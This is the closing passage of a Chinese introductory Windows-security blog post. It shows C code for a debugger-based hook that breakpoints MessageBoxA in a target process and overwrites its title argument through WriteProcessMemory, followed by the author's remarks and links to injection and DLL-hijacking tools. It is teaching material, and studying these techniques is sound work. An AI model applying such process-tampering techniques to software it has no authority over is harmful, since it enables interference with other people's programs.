&amp;pde-&gt;u.Exception.ExceptionRecord;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    SIZE_T titleAddr;</span><br><span class="line">    <span class="type">char</span> title[] = <span class="string">&quot;Hooked&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (per-&gt;ExceptionCode == EXCEPTION_BREAKPOINT) &#123;</span><br><span class="line">        <span class="keyword">if</span> (per-&gt;ExceptionAddress == procAddr) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 程序已中断！\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 解除hook</span></span><br><span class="line">            UninstallHook(procAddr);</span><br><span class="line">            <span class="comment">// 2. 获取线程上下文</span></span><br><span class="line">            ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">            GetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line">            <span class="comment">// 3. 更改参数值</span></span><br><span class="line">            ReadProcessMemory(g_cpdi.hProcess, (LPCVOID)(ctx.Esp + <span class="number">12</span>), &amp;titleAddr, <span class="keyword">sizeof</span>(SIZE_T), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">//printf(&quot;[-] ESP地址：%ph\n&quot;, ctx.Esp);</span></span><br><span class="line">            <span class="comment">//printf(&quot;[-] MSG函数参数为：%x\n&quot;, &amp;titleAddr);</span></span><br><span class="line">            DWORD dwOldProtect;</span><br><span class="line">            VirtualProtectEx(g_cpdi.hProcess, (LPVOID)titleAddr, <span class="number">7</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, (LPVOID)titleAddr, (LPVOID)title, <span class="number">7</span>, <span class="literal">NULL</span>);</span><br><span class="line">            VirtualProtectEx(g_cpdi.hProcess, (LPVOID)titleAddr, <span class="number">7</span>, dwOldProtect, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="comment">// 4. 还原EIP指针</span></span><br><span class="line">            ctx.Eip = (SIZE_T)procAddr;</span><br><span class="line">            SetThreadContext(g_cpdi.hThread, &amp;ctx);</span><br><span class="line">            Sleep(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 5. 恢复运行进程</span></span><br><span class="line">            ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">            <span class="comment">// 6. Hook</span></span><br><span class="line">            WriteProcessMemory(g_cpdi.hProcess, procAddr, &amp;intOpcode, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DebugLoop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    PROC procAddr = GetProcAddress(LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 已附加到程序！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Hook API地址：%ph\n&quot;</span>, procAddr);</span><br><span class="line">    DEBUG_EVENT de;     <span class="comment">//调试事件</span></span><br><span class="line">    <span class="comment">//等待调试事件的发生</span></span><br><span class="line">    <span class="keyword">while</span> (WaitForDebugEvent(&amp;de, INFINITE)) &#123;<span class="comment">//等待调试信息，收到调试信息立即返回进入循环</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被调试进程生成或附加事件,被调试进程启动或者附加时执行</span></span><br><span class="line">        <span class="keyword">if</span> (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            InstallHook(procAddr, &amp;de);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//异常事件调试，负责处理INT3中断事件</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            Hook(procAddr, &amp;de);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//被调试进程终止事件，进程中止后，调试器也结束</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//再次运行被调试者</span></span><br><span class="line">        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5-写在最后"><a href="#5-写在最后" class="headerlink" title="5 写在最后"></a>5 写在最后</h2><p>这是一篇入门性质的文章，列举了Windows系统中的一些安全问题。我在写这篇文章之前惊奇的发现我做的这些实验竟然都在《逆向工程核心原理》一书中的前几章中提到了，所以就把这4部分放在一起做了总结。<br>第一篇文章，写的很仓促很潦草，如果有任何错误和遗漏恳请大家的指正和补充。</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6 参考"></a>6 参考</h2><ul>
<li><em><a target="_blank" rel="noopener" href="https://github.com/Antonin-Deniau/cave_miner">https://github.com/Antonin-Deniau/cave_miner</a></em></li>
<li><em><a target="_blank" rel="noopener" href="https://github.com/HackerajOfficial/injectAllTheThings">https://github.com/HackerajOfficial/injectAllTheThings</a></em></li>
<li><em><a target="_blank" rel="noopener" href="https://github.com/ctxis/DLLHSC">https://github.com/ctxis/DLLHSC</a></em></li>
<li><em>kn0sky的博客：<a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=31">https://www.kn0sky.com/?p=31</a></em></li>
</ul>

        </article>
        <section class="post-near">
            <ul>
                
                    <li>上一篇: <a href="/2024/03/09/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/">x86保护模式——Windows安全入门（二）</a></li>
                
                
                    <li>下一篇: <a href="/2023/10/24/The-First-Post/">The-First-Post</a></li>
                
            </ul>
        </section>
        
    
        <section class="post-author">
        
            <figure class="author-avatar">
                <img src="https://imgloc.com/image/QTf8m" alt="reop" />
            </figure>
        
            <div class="author-info">
                <h4>reop</h4>
                <p>太菜了，懒得喷</p>
            </div>
        </section>
    
    </div>
</main>

    <footer>
    <div class="buttons">
        <a class="to-top" href="#"></a>
    </div>
    <div class="wrap min">
        <section class="widget">
            <div class="row">
                <div class="col-m-4">
                    <h3 class="title-recent">最新文章：</h3>
                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/03/09/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/">x86保护模式——Windows安全入门（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/02/%E6%B3%A8%E5%85%A5%E3%80%81%E5%8A%AB%E6%8C%81%E5%92%8CHook%E2%80%94%E2%80%94Windows%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/">注入、劫持和Hook——Windows安全入门（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/24/The-First-Post/">The-First-Post</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-date">时光机：</h3>
                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-tags">标签云：</h3>
                    <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a>
                </div>
            </div>
        </section>
        <section class="sub-footer">
            <p>© 2024 <a href="/">REOP</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
        </section>
    </div>
</footer>


<script src="/static/kico.js"></script>
<script src="/static/hingle.js"></script>


<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>

  </body>
</html>
